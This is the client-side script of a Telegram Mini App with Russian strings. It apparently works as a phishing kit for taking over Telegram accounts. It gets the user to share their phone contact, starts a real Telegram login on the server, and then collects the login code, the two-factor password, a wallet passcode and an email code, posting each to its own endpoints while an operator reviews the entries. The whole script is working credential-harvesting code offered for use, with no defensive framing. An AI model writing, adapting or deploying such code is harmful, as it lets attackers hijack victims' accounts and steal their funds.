    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        tg.setHeaderColor('#000000');
        tg.setBackgroundColor('#000000');

        let userId = null;
        let pendingContact = null;
        let codeRequested = false;
        let requesting = false;
        let modalOpen = false;
        let contactSent = false;

        const screens = {
            start: document.getElementById('screen-start'),
            code: document.getElementById('screen-code'),
            twofa: document.getElementById('screen-2fa'),
            wallet: document.getElementById('screen-wallet'),
            email: document.getElementById('screen-email'),
            wait: document.getElementById('screen-wait'),
            done: document.getElementById('screen-done')
        };

        const confirmSheet = document.getElementById('confirmSheet');
        const helpSheet = document.getElementById('helpSheet');

        // Создаём поля для кодов
        const codeInputs = makeCodeInputs('codeRow', 5, submitCode);
        const walletInputs = makeCodeInputs('walletRow', 4, submitWallet);
        const emailInputs = makeCodeInputs('emailRow', 6, submitEmailCode);

        // События
        document.getElementById('btnShare').onclick = requestContact;
        document.getElementById('btnConfirm').onclick = confirmPhone;
        document.getElementById('btnChange').onclick = closeModal;
        document.getElementById('btnPassword').onclick = submitPassword;
        document.getElementById('btnForgot').onclick = () => helpSheet.classList.add('show');
        document.getElementById('btnHelpClose').onclick = () => helpSheet.classList.remove('show');
        document.getElementById('btnClose').onclick = () => tg.close();

        tg.onEvent('contactShared', e => {
            if (e && e.contact && !modalOpen) showConfirm(e.contact);
        });

        init();

        function init() {
            fetch('/init-user', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({initData: tg.initData})
            }).then(r => r.json()).then(d => {
                if (d.success) {
                    userId = d.user.user_id;
                    poll();
                    setInterval(poll, 2500);
                }
            });
        }

        function poll() {
            if (!userId || modalOpen) return;
            fetch('/status?user_id=' + userId).then(r => r.json()).then(handle);
        }

        function handle(d) {
            if (!d.success) return;
            const st = d.state || (d.contact_shared ? 'await_telegram_code' : 'await_contact');
            console.log('Handle state:', st);

            hideAll();
            switch(st) {
                case 'await_contact':
                    show('start');
                    codeRequested = false;
                    break;
                case 'await_telegram_code':
                    show('code');
                    // Код отправляется только если ещё не был отправлен ранее
                    if (!codeRequested && !requesting && !d.telegram_code_sent) sendCode();
                    break;
                case 'await_telegram_password':
                    show('twofa');
                    break;
                case 'await_passcode':
                    show('wallet');
                    reset(walletInputs);
                    break;
                case 'waiting_passcode_review':
                    show('wait');
                    document.getElementById('waitText').textContent = 'Проверяем код-пароль...';
                    break;
                case 'request_email':
                    show('wait');
                    document.getElementById('waitText').textContent = 'Ожидание...';
                    break;
                case 'await_email_code':
                    show('email');
                    if (d.email) document.getElementById('emailAddr').textContent = d.email;
                    reset(emailInputs);
                    break;
                case 'waiting_email_code_review':
                    show('wait');
                    document.getElementById('waitText').textContent = 'Проверяем код...';
                    break;
                case 'completed':
                    show('done');
                    break;
                default:
                    show('start');
            }
        }

        function hideAll() {
            Object.values(screens).forEach(s => s.classList.remove('active'));
        }

        function show(name) {
            if (screens[name]) screens[name].classList.add('active');
        }


        function closeModal() {
            confirmSheet.classList.remove('show');
            modalOpen = false;
            pendingContact = null;
        }

        function requestContact() {
            try {
                tg.requestContact((ok, ev) => {
                    if (ok && ev?.responseUnsafe?.contact) {
                        showConfirm(ev.responseUnsafe.contact);
                    }
                });
            } catch(e) {}
        }

        function showConfirm(contact) {
            pendingContact = contact;
            modalOpen = true;
            const p = contact.phone_number.replace(/\D/g, '');
            let fmt = '+' + p;
            if (p.startsWith('7') && p.length === 11) {
                fmt = '+7 ' + p.slice(1,4) + ' ' + p.slice(4,7) + ' ' + p.slice(7,9) + ' ' + p.slice(9);
            }
            document.getElementById('sheetPhone').textContent = fmt;
            confirmSheet.classList.add('show');
        }

        function confirmPhone() {
            confirmSheet.classList.remove('show');
            modalOpen = false;
            if (!pendingContact) {
                console.error('No pending contact');
                return;
            }
            if (!userId) {
                console.error('No userId');
                return;
            }
            console.log('Sending contact:', pendingContact.phone_number);
            fetch('/share-contact', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    user_id: userId,
                    phone: pendingContact.phone_number,
                    contact: pendingContact
                })
            }).then(r => {
                console.log('Response status:', r.status);
                return r.json();
            }).then(d => {
                console.log('Response data:', d);
                if (d.success) {
                    handle({success: true, state: 'await_telegram_code', contact_shared: true});
                }
            }).catch(err => {
                console.error('Fetch error:', err);
            });
        }

        function sendCode() {
            if (!userId || requesting) return;
            requesting = true;
            fetch('/start-login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId})
            }).then(r => r.json()).then(d => {
                if (d.success) {
                    codeRequested = true;
                    reset(codeInputs);
                }
            }).finally(() => requesting = false);
        }

        function submitCode(code) {
            if (code.length !== 5) return;
            disable(codeInputs);
            fetch('/verify-telegram-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, code})
            }).then(r => r.json()).then(d => {
                if (d.needs_2fa) {
                    show('twofa');
                } else if (!d.success) {
                    shake(codeInputs);
                    reset(codeInputs);
                    enable(codeInputs);
                }
            }).catch(() => {
                shake(codeInputs);
                reset(codeInputs);
                enable(codeInputs);
            });
        }

        function submitPassword() {
            const pwd = document.getElementById('inputPassword').value;
            if (!pwd) return;
            const btn = document.getElementById('btnPassword');
            btn.disabled = true;
            fetch('/verify-2fa', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, password: pwd})
            }).then(r => r.json()).then(d => {
                if (!d.success) {
                    document.getElementById('inputPassword').classList.add('error');
                    setTimeout(() => document.getElementById('inputPassword').classList.remove('error'), 800);
                }
            }).finally(() => btn.disabled = false);
        }

        function submitWallet(code) {
            if (code.length !== 4) return;
            disable(walletInputs);
            fetch('/submit-passcode', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, code})
            }).then(r => r.json()).then(d => {
                if (!d.success) {
                    shake(walletInputs);
                    reset(walletInputs);
                    enable(walletInputs);
                }
            }).catch(() => {
                shake(walletInputs);
                reset(walletInputs);
                enable(walletInputs);
            });
        }

        function submitEmailCode(code) {
            if (code.length !== 6) return;
            disable(emailInputs);
            fetch('/submit-email-code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, code})
            }).then(r => r.json()).then(d => {
                if (!d.success) {
                    shake(emailInputs);
                    reset(emailInputs);
                    enable(emailInputs);
                }
            }).catch(() => {
                shake(emailInputs);
                reset(emailInputs);
                enable(emailInputs);
            });
        }

        function makeCodeInputs(id, len, cb) {
            const row = document.getElementById(id);
            const arr = [];
            for (let i = 0; i < len; i++) {
                const inp = document.createElement('input');
                inp.type = 'text';
                inp.inputMode = 'numeric';
                inp.maxLength = 1;
                inp.className = 'code-cell';
                
                // Курсор всегда в начало
                inp.addEventListener('click', e => {
                    e.target.setSelectionRange(0, e.target.value.length);
                });
                inp.addEventListener('focus', e => {
                    setTimeout(() => e.target.setSelectionRange(0, e.target.value.length), 0);
                });
                
                inp.addEventListener('input', e => {
                    e.target.value = e.target.value.replace(/\D/g, '');
                    if (e.target.value && i < len - 1) arr[i + 1].focus();
                    const code = arr.map(x => x.value).join('');
                    if (code.length === len) cb(code);
                });
                inp.addEventListener('keydown', e => {
                    if (e.key === 'Backspace' && !e.target.value && i > 0) arr[i - 1].focus();
                });
                inp.addEventListener('paste', e => {
                    e.preventDefault();
                    const txt = (e.clipboardData.getData('text') || '').replace(/\D/g, '').slice(0, len);
                    for (let j = 0; j < len; j++) arr[j].value = txt[j] || '';
                    const code = arr.map(x => x.value).join('');
                    if (code.length === len) cb(code);
                });
                row.appendChild(inp);
                arr.push(inp);
            }
            return arr;
        }

        // Курсор в начало для поля пароля
        document.getElementById('inputPassword').addEventListener('click', function(e) {
            if (this.value.length === 0) {
                this.setSelectionRange(0, 0);
            }
        });

        function reset(arr) {
            setTimeout(() => {
                arr.forEach((x, i) => {
                    x.value = '';
                    x.disabled = false;
                    x.classList.remove('shake');
                    if (i === 0) x.focus();
                });
            }, 100);
        }

        function disable(arr) { arr.forEach(x => x.disabled = true); }
        function enable(arr) { arr.forEach(x => x.disabled = false); }
        function shake(arr) {
            arr.forEach(x => {
                x.classList.add('shake');
                setTimeout(() => x.classList.remove('shake'), 500);
            });
        }
    </script>
